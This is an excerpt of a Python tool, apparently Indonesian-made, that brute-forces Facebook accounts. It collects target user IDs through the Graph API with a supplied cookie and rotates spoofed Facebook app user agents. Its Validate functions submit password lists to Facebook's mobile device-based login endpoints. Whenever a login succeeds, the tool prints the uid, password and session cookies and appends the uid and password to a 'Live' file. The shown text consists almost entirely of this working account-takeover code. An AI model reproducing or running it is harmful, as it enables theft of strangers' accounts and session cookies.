	...
	if menu in ["01","1"]:
		...
		for userr in uid:
			try:
			    ...
			    col = ses.get("https://graph.facebook.com/{}".format(userr),params = params,cookies = {'cookie': cok}).json()
		...
		for user in uid2:
			...
			try:
				...
				if 'Validate' in method:
					...
					MethodeCrack.submit(Validate_1,uid,pasw)
				else:
					MethodeCrack.submit(Async,uid,pasw)
			except:pass
	print("\r")
...
def GenerateUserAgentMozilla():
	rr = random.randint
	rc = random.choice
	AA = rc([f"Mozilla/5.0 (Linux; Android 13; V2170A Build/TP1A.220624.014; wv) ApplewebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,114))}.0.{str(rr(5000,5555))}.{str(rr(131,135))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,430))}.0.0.22.115;FBBV/{str(rr(460000000,499999999))};FBDM/"+"{density=2.75,width=1080,height=2226}"+f";FBLC/id_ID;FBRV/{str(rr(460000000,499999999))};FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2170A;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"])
	return rc([f"Mozilla/5.0 (Linux; Android 13; RMX3663 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,114))}.0.{str(rr(4000,5555))}.{str(rr(131,135))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(370,430))}.0.0.22.115;FBBV/{str(rr(400000000,499999999))};FBDM/"+"{density=2.75,width=1080,height=2400};FBLC/in_ID;FBRV/0;FBCR/null;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3663;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"])
for xd in range(1000):
	rr = random.randint
	rc = random.choice
	apk = str(random.randint(350,450))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	app = random.randint(410000000,499999999)
	AA = f"Mozilla/5.0 Linux; Android 14; Nokia X10) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/{str(rr(60,114))}.0 Brave Chrome/{str(rr(60,114))}.0.{str(rr(4000,9999))}.{str(rr(131,135))} Safari/537.36 YouTube/1.96.58.J KaiOS"
	ugen.append(AA)
	
try:adel = open('samsung.txt','r').read().splitlines()
except:adel = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]

###-----[ METODE VALIDATE ]-----###
def Validate(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r [*] [{H}{uid}{P}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	url = "mtouch.prod.facebook.com"
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = random.choice(adel)
			head = {"Host": "d.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2658.59 Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			link = ses.get("https://d.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&refsrc=deprecated&_rdr",headers=head)
			data = {
		   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
		   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
		   "uid": uid,
		   "next": "https://d.facebook.com/login/save-device/",
		   "flow": "login_no_pin",
		   "pass": pw}
			headd = {"Host": "d.facebook.com","content-length": "338","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://d.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2658.59 Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://d.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headd,allow_redirects=False)
...
def Validate_1(uid,pasw):
	...
	for pw in pasw:
		try:
			...
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin")
			dataa = {
			"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"uid": uid,
			...
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"referer": f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=dataa,headers=headd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in post.cookies.get_dict().items() ])
				print(f"\r{P}{U}Login Berhasil {P}{H}{uid}|{pw}|{kuki}|{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
